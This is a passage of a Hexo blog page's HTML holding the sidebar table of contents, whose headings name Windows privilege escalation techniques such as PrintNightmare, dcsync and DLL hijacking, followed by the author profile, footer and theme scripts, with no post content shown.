文件传输</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="nav-number">2.11.</span> <span class="nav-text"> 端口转发</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-2"><span class="nav-number">2.12.</span> <span class="nav-text"> 权限提升</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">2.12.1.</span> <span class="nav-text"> EXP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#runascs"><span class="nav-number">2.12.2.</span> <span class="nav-text"> runascs</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#printnightmare"><span class="nav-number">2.12.3.</span> <span class="nav-text"> PrintNightmare</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#alwaysinstallelevated"><span class="nav-number">2.12.4.</span> <span class="nav-text"> alwaysinstallelevated</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#seimpersonateprivilegesecreateglobalprivilege"><span class="nav-number">2.12.5.</span> <span class="nav-text"> SeImpersonatePrivilege&#x2F;SeCreateGlobalPrivilege</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%94%99%E8%AF%AF%E9%85%8D%E7%BD%AE%E8%AF%81%E4%B9%A6%E6%A8%A1%E6%9D%BF"><span class="nav-number">2.12.6.</span> <span class="nav-text"> 错误配置证书模板</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dcsync"><span class="nav-number">2.12.7.</span> <span class="nav-text"> dcsync</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1"><span class="nav-number">2.12.8.</span> <span class="nav-text"> 服务</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E7%A8%8B%E5%BA%8F"><span class="nav-number">2.12.8.1.</span> <span class="nav-text"> 服务程序</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#dll%E5%8A%AB%E6%8C%81"><span class="nav-number">2.12.8.2.</span> <span class="nav-text"> DLL劫持</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#unquoted-service-paths"><span class="nav-number">2.12.8.3.</span> <span class="nav-text"> Unquoted Service Paths</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="nav-number">2.12.9.</span> <span class="nav-text"> 计划任务</span></a></li></ol></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">xXxYOLOxXx</p>
  <div class="site-description" itemprop="description">Explorer for unknown.</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">46</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">3</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">53</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/monster414" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;monster414" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:yolo-yolo@qq.com" title="E-Mail → mailto:yolo-yolo@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://music.163.com/#/user/home?id=302397927" title="CloudMisuc → https:&#x2F;&#x2F;music.163.com&#x2F;#&#x2F;user&#x2F;home?id&#x3D;302397927" rel="noopener" target="_blank"><i class=" fa-fw"></i>CloudMisuc</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://steamcommunity.com/id/Purple_Miracle/" title="Steam → https:&#x2F;&#x2F;steamcommunity.com&#x2F;id&#x2F;Purple_Miracle&#x2F;" rel="noopener" target="_blank"><i class=" fa-fw"></i>Steam</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://yoloyolo.top/atom.xml" title="RSS → https:&#x2F;&#x2F;yoloyolo.top&#x2F;atom.xml"><i class="fa fa-rss fa-fw"></i>RSS</a>
      </span>
  </div>
  <div class="cc-license motion-element" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
  </div>



      </div>
        <div class="back-to-top motion-element">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">xXxYOLOxXx</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a>
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
